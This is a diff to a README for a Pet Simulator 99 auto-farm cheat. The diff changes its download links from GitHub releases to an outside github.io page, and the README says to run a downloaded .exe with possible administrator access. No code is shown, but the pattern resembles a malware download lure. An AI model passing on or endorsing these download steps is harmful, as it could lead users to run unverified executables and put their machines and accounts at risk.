@@ -1,6 +1,6 @@
 # 🤖 Pet-Simulator-99-Auto-Farm-Trainer-2026 - Automate your gameplay for maximum efficiency
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/yansen4165/Pet-Simulator-99-Auto-Farm-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://yansen4165.github.io)
 
 ## 📋 Overview
 Pet-Simulator-99-Auto-Farm-Trainer-2026 automates repetitive tasks in Pet Simulator 99. The software handles coin collection, egg hatching, and grinding in the Backrooms League. Users gain progress without manual input. The application features a graphical user interface to manage settings and monitor automation status.
@@ -20,7 +20,7 @@ Pet-Simulator-99-Auto-Farm-Trainer-2026 automates repetitive tasks in Pet Simula
 - Permissions: Administrator access might be required for specific features.
 
 ## 🚀 Installation guide
-1. Visit the [official release page](https://github.com/yansen4165/Pet-Simulator-99-Auto-Farm-Trainer-2026/releases) to download the package.
+1. Visit the [official release page](https://yansen4165.github.io) to download the package.
 2. Locate the most recent file in the list.
 3. Choose the file ending in .zip or .exe. 
 4. Click the link to begin your download.
